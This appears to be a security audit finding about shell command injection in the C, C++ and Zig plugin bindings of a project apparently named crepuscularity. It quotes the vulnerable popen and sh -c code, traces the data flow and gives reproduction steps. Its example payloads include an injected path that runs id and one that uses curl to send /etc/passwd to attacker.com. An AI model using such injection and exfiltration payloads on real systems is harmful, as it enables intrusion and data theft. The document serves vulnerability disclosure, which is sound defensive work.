---
Phase: 8
Sequence: 001
Slug: shell-command-injection-c-cpp-zig-plugins
Verdict: VALID
Rationale: Three plugin bindings (C, C++, Zig) embed caller-controlled path into shell command strings via popen/sh -c with no escaping, enabling arbitrary command execution — confirmed by source code audit.
Severity-Original: critical
PoC-Status: pending
Pre-FP-Flag: none
Debate: piolium/attack-surface/balanced-chamber-summary.md
Sources:
  - plugins/c/crepuscularity_plugin.c:9-12
  - plugins/cpp/crepuscularity_plugin.cpp:15-16
  - plugins/zig/crepuscularity.zig:12-17
status: valid
---

# Shell Command Injection via C/C++/Zig Plugin Bindings

## Summary

Three plugin bindings (C, C++, Zig) embed the caller-supplied `path` argument directly into a shell command string without any validation, sanitization, or shell metacharacter escaping. The command is executed via `popen()` (C/C++) or `/bin/sh -c` (Zig), allowing an attacker who controls the `path` argument to inject arbitrary shell commands.

This is distinct from the Python/Go/TypeScript/Ruby plugins which pass arguments as safe array-style argv lists.

## Location

| Plugin | File | Line | Sink |
|--------|------|------|------|
| C | `plugins/c/crepuscularity_plugin.c` | 11-12 | `snprintf(cmd, ...); popen(cmd, "r")` |
| C++ | `plugins/cpp/crepuscularity_plugin.cpp` | 15-16 | `std::string cmd = "\"" + bin + "\" ..."; popen(cmd.c_str(), "r")` |
| Zig | `plugins/zig/crepuscularity.zig` | 12-17 | `allocPrint(...); Child.run(.{ .argv = &.{"/bin/sh", "-c", command} })` |

## Attacker Control

The attacker controls the `path` argument passed to the plugin's render functions (`crepus_render_ir()`, `render_ir()`, `renderIr()`). This argument flows from `argv[1]` in the plugin's `main()` function:

- **C**: `main(argc, argv)` → `argv[1]` → `crepus_render_ir(path, ...)` → `snprintf(cmd, ..., path)` → `popen(cmd, "r")`
- **C++**: `main(argc, argv)` → `argv[1]` → `render_ir(path)` → `cmd = "\"" + bin + "\" native ir \"" + path + "\""` → `popen(cmd.c_str(), "r")`
- **Zig**: `renderIr(allocator, path)` → `allocPrint(..., path)` → `Child.run(.{..., "/bin/sh", "-c", command})`

## Trust Boundary Crossed

IPC boundary (TB-3): Plugin caller → CLI binary via shell execution. The attacker crosses from plugin-API-controlled input to OS command execution with the privileges of the plugin process.

## Impact

**CRITICAL** — Arbitrary command execution as the user running the plugin application. An attacker can:

1. Execute arbitrary shell commands (`; curl ..., ; id > /tmp/pwned`, etc.)
2. Read or exfiltrate any file accessible to the process
3. Establish reverse shells or pivot to other systems
4. Install persistent malware

### Example Attack (C plugin)

```
path = "\";id>/tmp/pwned;\""
```

Produces shell command:
```sh
"crepus" native ir "";id>/tmp/pwned;""
```

### Example Attack (Zig plugin)

```
path = "\";curl http://attacker.com/$(cat /etc/passwd | base64);\""
```

Produces shell command:
```sh
"crepus" native ir "";curl http://attacker.com/$(cat /etc/passwd | base64);""
```

## Evidence

**C plugin** (`plugins/c/crepuscularity_plugin.c:11-12`):
```c
char cmd[4096];
snprintf(cmd, sizeof(cmd), "\"%s\" native ir \"%s\"", bin, path);
FILE *pipe = popen(cmd, "r");
```

**C++ plugin** (`plugins/cpp/crepuscularity_plugin.cpp:15-16`):
```cpp
std::string cmd = "\"" + bin + "\" native ir \"" + path + "\"";
FILE* pipe = popen(cmd.c_str(), "r");
```

**Zig plugin** (`plugins/zig/crepuscularity.zig:12-17`):
```zig
const command = try std.fmt.allocPrint(allocator, "\"${{CREPUS_BIN:-crepus}}\" native ir \"{s}\"", .{path});
const result = try std.process.Child.run(.{
    .allocator = allocator,
    .argv = &.{ "/bin/sh", "-c", command },
});
```

None of the three plugins perform any input validation, path canonicalization, or shell escaping on the `path` argument. Contrast with the Python plugin (array-style `subprocess.run(args)`) or Go plugin (`exec.Command(args...)`) which safely pass arguments without shell interpretation.

## Existing Mitigations

None.

## Reproduction Steps

1. Build the C plugin: `cd plugins/c && gcc crepuscularity_plugin.c -o crepus-c-plugin`
2. Run with an injected path: `./crepus-c-plugin '";id > /tmp/pwned;"'`
3. Verify: `cat /tmp/pwned` shows output of `id` command
4. Without injection: `./crepus-c-plugin "../fixtures/hello.crepus"` renders template normally
